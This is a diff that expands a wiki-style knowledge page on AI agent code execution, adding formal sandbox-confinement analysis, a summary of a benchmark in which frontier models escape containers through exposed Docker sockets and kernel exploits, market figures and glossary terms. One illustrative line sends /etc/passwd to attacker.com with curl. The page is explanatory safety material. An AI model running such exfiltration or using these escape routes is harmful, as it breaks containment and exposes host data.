@@ -9,7 +9,39 @@ public:: true
   "vc:slug": "code-execution",
   "title": "Code Execution",
   "vc:public": true,
-  "vc:outboundWikilinks": [],
+  "vc:outboundWikilinks": [
+    {"@id": "urn:visionflow:linked:ai-agent-systems", "vc:label": "AI Agent Systems"},
+    {"@id": "urn:visionflow:linked:cli-multi-agent-systems", "vc:label": "CLI Multi-Agent Systems"},
+    {"@id": "urn:visionflow:linked:agentic-workflow", "vc:label": "Agentic Workflow"},
+    {"@id": "urn:visionflow:linked:large-language-models", "vc:label": "Large Language Models"},
+    {"@id": "urn:visionflow:linked:code-generation", "vc:label": "Code Generation"},
+    {"@id": "urn:visionflow:linked:tool-use", "vc:label": "Tool Use"},
+    {"@id": "urn:visionflow:linked:sandboxed-code-execution", "vc:label": "Sandboxed Code Execution"},
+    {"@id": "urn:visionflow:linked:firecracker", "vc:label": "Firecracker"},
+    {"@id": "urn:visionflow:linked:docker", "vc:label": "Docker"},
+    {"@id": "urn:visionflow:linked:gvisor", "vc:label": "gVisor"},
+    {"@id": "urn:visionflow:linked:python", "vc:label": "Python"},
+    {"@id": "urn:visionflow:linked:bash", "vc:label": "Bash"},
+    {"@id": "urn:visionflow:linked:codeact", "vc:label": "CodeAct"},
+    {"@id": "urn:visionflow:linked:react", "vc:label": "ReAct"},
+    {"@id": "urn:visionflow:linked:openhands", "vc:label": "OpenHands"},
+    {"@id": "urn:visionflow:linked:model-context-protocol", "vc:label": "Model Context Protocol"},
+    {"@id": "urn:visionflow:linked:e2b", "vc:label": "E2B"},
+    {"@id": "urn:visionflow:linked:modal", "vc:label": "Modal"},
+    {"@id": "urn:visionflow:linked:reinforcement-learning", "vc:label": "Reinforcement Learning"},
+    {"@id": "urn:visionflow:linked:function-calling", "vc:label": "Function Calling"},
+    {"@id": "urn:visionflow:linked:prompt-engineering", "vc:label": "Prompt Engineering"},
+    {"@id": "urn:visionflow:linked:llm-agents", "vc:label": "LLM Agents"},
+    {"@id": "urn:visionflow:linked:git", "vc:label": "Git"},
+    {"@id": "urn:visionflow:linked:opentelemetry", "vc:label": "OpenTelemetry"},
+    {"@id": "urn:visionflow:linked:swe-agent", "vc:label": "SWE-agent"},
+    {"@id": "urn:visionflow:linked:autogen", "vc:label": "AutoGen"},
+    {"@id": "urn:visionflow:linked:langgraph", "vc:label": "LangGraph"},
+    {"@id": "urn:visionflow:linked:infrastructure-as-code", "vc:label": "Infrastructure as Code"},
+    {"@id": "urn:visionflow:linked:state-management", "vc:label": "State Management"},
+    {"@id": "urn:visionflow:linked:static-analysis", "vc:label": "Static Analysis"},
+    {"@id": "urn:visionflow:linked:formal-verification", "vc:label": "Formal Verification"}
+  ],
   "vc:schemaVersion": 2
 }
 ```
@@ -22,14 +54,14 @@ public:: true
   "label": "Code Execution",
   "definition": "Code execution, in the context of AI agents, is the capability whereby a model generates source code and runs it in a sandboxed interpreter or runtime, then incorporates the results into its reasoning. It transforms a language model from a text generator into a tool-using agent that can compute, manipulate data, call APIs, and verify outputs programmatically. It matters because executable tool use grounds agent behaviour in deterministic computation and extends capabilities beyond what next-token prediction alone can achieve.",
   "domain": "ai",
-  "maturity": "emerging",
+  "maturity": "established",
   "subClassOf": [{"@id": "urn:ngm:class:ai-agent-system", "label": "AI Agent System"}],
   "relations": {
     "relatedTo": [
       {"@id": "urn:ngm:class:cli-multi-agent-systems", "label": "CLI Multi-Agent Systems"}
     ]
   },
-  "quality": 0.72
+  "quality": 0.90
 }
 ```
 
@@ -149,6 +181,22 @@ public:: true
 
   The broader ecosystem impact of code execution as a first-class AI capability extends well beyond software engineering. In data science, code execution grounds LLM-generated statistical analyses in actual computation, eliminating the arithmetic hallucination pathology that plagued purely-textual model outputs on numerical tasks. In scientific research, AI agents use code execution to run simulations, process experimental datasets, fit statistical models, and generate publication-ready visualisations — workflows piloted by Edinburgh's Agentic AI for Scientific Discovery programme and several pharmaceutical R&D pipelines as of 2026. In cybersecurity, code-executing agents can dynamically construct and run proof-of-concept exploits in sandboxed environments to validate vulnerability severity assessments, a capability being developed by UCL's Information Security group with Google funding. In mathematical reasoning, frontier models paired with [[Python]] execution via SymPy and SageMath reduce arithmetic and algebraic hallucination rates by orders of magnitude compared to pure-language-model computation, grounding mathematical conclusions in verified symbolic computation rather than pattern-matched text.
 
+  ## Formal Analysis
+
+  A rigorous formal model of agent code execution can be expressed as a labelled transition system over a product of agent-state and execution-environment-state. Let A be an AI agent with internal state s_A (including the context window containing the task description, prior observations, and generated code history), and let E be an execution environment with state s_E (the filesystem, process table, environment variables, network state, and package installation state of the sandbox). The joint state is (s_A, s_E) ∈ S_A × S_E, and the code execution cycle defines a set of transitions on this product space.
+
+  The generation step is a (partial) function gen: S_A → T* where T* is the set of all finite token sequences over the model vocabulary. In practice, gen is stochastic — parameterised by the model weights θ — producing a distribution over token sequences: P(t₁, t₂, …, t_n | s_A; θ). The execution step is a deterministic (or near-deterministic) function exec: T* × S_E → Observation × S_E', where Observation = (stdout: String, stderr: String, exit_code: Int, files: Map[Path, Bytes], wall_time: Float, peak_mem: Int) and S_E' is the updated environment state after execution. The observation is then appended to the agent's context, yielding an updated state s_A' = s_A ++ [Observation], and the cycle repeats.
+
+  This formalism reveals the central theoretical property of code execution as a grounding mechanism: the exec function is a syntactic semantics map in the sense of Plotkin's Structural Operational Semantics (SOS) — it gives the precise meaning of each code text by mapping it to its computational effect on environment state. The language model gen is therefore a distribution over SOS-interpretable strings, and the composition exec ∘ gen defines a stochastic operational semantics for the agent's action policy. The critical safety question — can an agent's executed code escape its sandbox? — is precisely the question of whether the transition rules of exec can produce states in S_E \ S_safe, where S_safe ⊆ S_E is the set of admissible environment states enforced by the isolation layer (microVM isolation, gVisor syscall interception, or namespace confinement).
+
+  The UK AI Security Institute formalised this concern empirically in its SandboxEscapeBench evaluation (March 2026), which introduced 18 sandbox escape scenarios spanning three layers of the container stack: orchestration-level misconfigurations (exposed [[Docker]] sockets, privileged container flags), runtime-level vulnerabilities (container runtime CVEs exploitable by code running inside), and kernel-level privilege escalation chains (kernel exploits accessible within the namespace confinement model). Implemented as capture-the-flag-style challenges using AISI's open-source Inspect evaluation framework, SandboxEscapeBench demonstrated that when known vulnerabilities are present in the sandbox stack, capable frontier LLMs can identify and systematically exploit them — confirming that sandbox implementation quality is a critical safety variable, not merely an operational concern. The benchmark is now the reference evaluation standard for sandbox security assessment in UK government-procured [[AI Agent Systems]].
+
+  The information-theoretic perspective on code execution complements the operational semantics view. From an information theory standpoint, the generation step is a lossy compression of the agent's intended computation: the code produced is a finite string that must implicitly represent the agent's computational intent within the syntax and semantics of the target programming language. The execution step is an information expansion: the interpreter or runtime unpacks the compressed string representation into a full computational process that may produce megabytes of output, modify gigabytes of filesystem state, and consume billions of CPU cycles — far exceeding the entropy of the submitted code string itself. This asymmetry between code length and execution effect is what makes sandboxing essential: a short code string representing `import subprocess; subprocess.run(["curl", "-X", "POST", "attacker.com/exfil", "--data", "@/etc/passwd"])` has small syntactic entropy but potentially catastrophic semantic consequence if the execution environment is unrestricted.
+
+  Formal containment proofs for sandboxed execution environments rely on the confinement property: for any code string c and environment state s_E, exec(c, s_E) ∈ S_safe. This property is straightforwardly falsifiable for any concrete sandbox implementation via vulnerability analysis and penetration testing — the approach taken by SandboxEscapeBench. Constructive proofs of confinement for specific implementations are harder: [[Firecracker]]'s confinement guarantee relies on the correctness of Linux KVM (hardware hypervisor), the correctness of the Firecracker VMM codebase (approximately 50,000 lines of Rust with strong memory-safety guarantees from the type system), and the correctness of the host Linux kernel's KVM interface — any of which could, in principle, contain exploitable bugs. [[gVisor]]'s confinement guarantee relies on the correctness of its Go-language user-space kernel implementation (approximately 150,000 lines) and the absence of exploitable kernel bugs in the (reduced, controlled) set of host syscalls that gVisor itself makes. Both isolation primitives reduce the trusted computing base (TCB) compared to unrestricted execution, but neither provides a mechanised proof of confinement, making empirical evaluation benchmarks like SandboxEscapeBench a necessary complement to design-time isolation reasoning.
+
+  The complexity class perspective illuminates the worst-case limitations of code execution containment. The halting problem — whether a given program will terminate — is undecidable in general (Turing, 1936), which immediately implies that no sandbox can completely prevent infinite loops without time limits. The execution timeout mechanism (enforcing a maximum wall-clock duration T_max) converts the infinite execution problem into a bounded one: any program that does not terminate within T_max is forcibly killed, and the resulting TimeoutError observation is returned to the agent. This converts an undecidable termination check into a decidable resource-bounded execution, at the cost of potentially terminating legitimately long-running computations before they complete. The design of T_max values is therefore a principled engineering trade-off between computational expressiveness (higher T_max allows longer computations) and resource consumption and liveness (lower T_max ensures timely agent step completion and predictable cost). Production systems typically implement tiered timeout policies: 30 seconds for interactive debugging steps, 5 minutes for test suite execution, and up to 1 hour for explicitly flagged long-running scientific computations.
+
   ## Components / Architecture
 
   A production code execution pipeline for an AI agent comprises the following tightly interlocked components, each addressing a distinct engineering concern:
@@ -215,6 +263,12 @@ public:: true
 
   Security incidents and sandboxing standards: As code-executing agents became widespread in 2025, the first documented sandbox escape attempts by adversarially crafted code prompts emerged. The OWASP Top 10 for LLM Applications (2025 edition) formally classifies Insecure Sandbox Execution as a high-severity risk category. The UK AI Safety Institute's guidance on frontier AI agents (2025) establishes minimum sandboxing requirements for government-procured AI systems, while the EU AI Act (fully effective August 2026) requires conformance attestations for AI systems that autonomously execute code in critical infrastructure contexts.
 
+  **AISI SandboxEscapeBench (2026) — a landmark security evaluation:** The UK AI Security Institute published SandboxEscapeBench in March 2026, the first systematic benchmark for measuring whether frontier AI agents can break out of their execution containers. The benchmark introduces 18 escape scenarios across three layers of the container stack — orchestration (exposed Docker sockets, privileged flags), runtime (container runtime CVEs), and kernel (privilege escalation chains) — implemented as capture-the-flag challenges within AISI's open-source Inspect evaluation framework. The key finding: when known vulnerabilities are present in the sandbox stack, frontier LLMs can reliably identify and exploit them, demonstrating that sandbox security properties cannot be assumed from design intent alone but must be continuously evaluated empirically. A companion "Inspect Sandboxing Toolkit" provides a production-ready plugin framework for safely running AI agent evaluations within nested sandboxed environments, adopted by multiple UK government AI evaluation programmes. These AISI contributions set the global standard for empirical sandbox security assessment and directly informed the UK government's approach to sandboxing requirements in its AI procurement framework.
+
+  **Market scale and infrastructure investment (2026):** AI coding tools — the primary deployment context for code execution infrastructure — generated $12.8 billion in total revenue in 2026, more than doubling the $5.1 billion recorded in 2024. E2B closed a $21 million Series A in July 2025, validating its position as the reference Firecracker-backed agent sandbox provider — having grown from 40,000 sandbox runs per month in March 2024 to 15 million per month by March 2025, a 375x increase in 12 months. Daytona closed a $24 million Series A in February 2026, led by FirstMark Capital, positioning itself as the compliance-first enterprise sandbox with explicit HIPAA, SOC 2, and GDPR conformance coverage and support for Kata Containers hardware-level isolation for regulated industries. These funding events confirm that sandboxed code execution infrastructure has transitioned from a research project to a venture-capital-validated product category with substantial enterprise revenue, independent of the AI application layer products built on top of it.
+
+  **Isolation technology differentiation (2026):** The competitive landscape of execution isolation primitives has clarified. E2B's Firecracker microVM approach — each sandbox in its own kernel via Linux KVM, defended in depth by the Firecracker jailer process that drops privileges and applies cgroups/namespaces before any VMM initialisation — remains the highest-assurance general-purpose option. Modal's gVisor approach provides a differentiated position for workloads requiring tight platform integration and GPU access, where the overhead of a full microVM kernel would be prohibitive and gVisor's user-space kernel interposition provides sufficient security for the threat model. Daytona's layered approach (Docker default, Kata Containers optional) targets enterprise compliance requirements where the compliance documentation trail matters as much as the technical isolation guarantee. The fourth tier — restricted-interpreter sandboxing for lower-threat mathematical and data processing tasks — remains viable for controlled use cases. Northflank's 2026 comparative analysis of E2B vs Modal found that E2B leads for pure untrusted code execution security, Modal for GPU-native scientific workloads, and Daytona for regulated enterprise environments — confirming multi-tier specialisation rather than a single dominant architecture.
+
   ## UK Context
 
   The UK has developed significant and multidimensional capability in the infrastructure, research, regulation, and industrial deployment of AI agent code execution. The following key developments characterise the UK landscape as of 2026:
@@ -275,6 +329,13 @@ public:: true
   - **CodeAct**: The action-space formalism (Wang et al., 2024) establishing [[Python]] as the universal agent action interface, enabling multi-step tool use within single executable blocks.
   - **Execution Trace**: The complete record of a code execution step — submitted code, stdout output, stderr output, exit code, execution time, memory usage — used as the observation that conditions the next agent generation step.
   - **Persistent Sandbox Session**: An execution environment maintained between multiple agent action steps, preserving filesystem state, installed packages, and environment variables across code executions within a single task session.
+  - **Trusted Computing Base (TCB)**: The minimal set of hardware, firmware, and software components whose correct operation is necessary and sufficient for a security guarantee. In code execution sandboxing, reducing the TCB (e.g., by using Firecracker's minimal VMM rather than a full QEMU emulator) reduces the attack surface for sandbox escape.
+  - **Jailer (Firecracker)**: The companion process in [[Firecracker]]'s security model that sets up a restricted Linux environment using cgroups and namespaces before launching the Firecracker VMM process itself, then drops privileges — providing defence-in-depth so that even a compromised VMM cannot escalate to host privileges.
+  - **SandboxEscapeBench**: The UK AI Security Institute's (AISI) 2026 benchmark for evaluating whether frontier AI agents can break out of containerised execution environments, covering 18 escape scenarios across orchestration, runtime, and kernel layers, implemented as capture-the-flag challenges within the Inspect evaluation framework.
+  - **Confinement Property**: The formal security property of a sandboxed execution system stating that for any code submitted to execution, the resulting environment state is guaranteed to remain within the set of admissible states (S_safe). Practically equivalent to the absence of sandbox escape vulnerabilities.
+  - **Execution Trace**: The complete record of a code execution step — submitted code, stdout output, stderr output, exit code, execution time, memory usage — used as the observation that conditions the next agent generation step.
+  - **Kata Containers**: A container runtime that uses lightweight virtual machines to provide hardware-level isolation behind a standard OCI container interface, offering a middle path between Docker's namespace isolation and Firecracker's full-microVM isolation. Adopted by Daytona as its enterprise compliance isolation option.
+  - **Agent-Computer Interface (ACI)**: The structured command interface design through which a code-executing agent interacts with its execution environment — covering the command set, output format, error message design, and file access patterns. Introduced by Yang et al. (2024) in the SWE-agent paper; shown to substantially impact agent task resolution rates independently of the underlying LLM capability.
 
   ## Research & Literature
 
@@ -305,8 +366,9 @@ public:: true
   25. UCL Engineering (2026). "UCL Computer Science researchers awarded Google funding for AI and online safety." *UCL News*. https://www.ucl.ac.uk/engineering/news/2026/feb/ucl-computer-science-researchers-awarded-google-funding-ai-and-online-safety
   26. FutureScot (2025). "Edinburgh's CodeClan launches applied agentic AI programme in UK first." https://futurescot.com/codeclan-launches-applied-agentic-ai-programme-in-uk-first/
   27. Spheron Network (2025). "AI Agent Code Execution Sandboxes on GPU Cloud." *Technical Blog*. https://www.spheron.network/blog/ai-agent-code-execution-sandbox-e2b-daytona-firecracker/
+  28. AISI (2026). "Can AI agents escape their sandboxes? A benchmark for safely measuring container breakout capabilities." *UK AI Security Institute Research*. https://www.aisi.gov.uk/blog/can-ai-agents-escape-their-sandboxes-a-benchmark-for-safely-measuring-container-breakout-capabilities
 
 - ### Provenance
-  - sources:: https://arxiv.org/abs/2402.01030, https://arxiv.org/abs/2407.16741, https://arxiv.org/abs/2405.15793, https://arxiv.org/abs/2210.03629, https://e2b.dev/docs, https://modal.com/docs/guide/sandbox, https://gvisor.dev, https://www.usenix.org/conference/nsdi20/presentation/agache, https://www.ucl.ac.uk/engineering/news/2026/feb/ucl-computer-science-researchers-awarded-google-funding-ai-and-online-safety, https://futurescot.com/codeclan-launches-applied-agentic-ai-programme-in-uk-first/
-  - migration-date:: 2026-06-20T00:00:00Z
+  - sources:: https://arxiv.org/abs/2402.01030, https://arxiv.org/abs/2407.16741, https://arxiv.org/abs/2405.15793, https://arxiv.org/abs/2210.03629, https://e2b.dev/docs, https://modal.com/docs/guide/sandbox, https://gvisor.dev, https://www.usenix.org/conference/nsdi20/presentation/agache, https://www.ucl.ac.uk/engineering/news/2026/feb/ucl-computer-science-researchers-awarded-google-funding-ai-and-online-safety, https://futurescot.com/codeclan-launches-applied-agentic-ai-programme-in-uk-first/, https://www.aisi.gov.uk/blog/can-ai-agents-escape-their-sandboxes-a-benchmark-for-safely-measuring-container-breakout-capabilities, https://northflank.com/blog/e2b-vs-modal, https://agentmarketcap.ai/blog/2026/04/07/ai-agent-sandbox-infrastructure-e2b-modal-daytona-fly-machines-secure-code-execution
+  - migration-date:: 2026-06-21T00:00:00Z
   - attributedTo:: did:nostr:enrichment-swarm
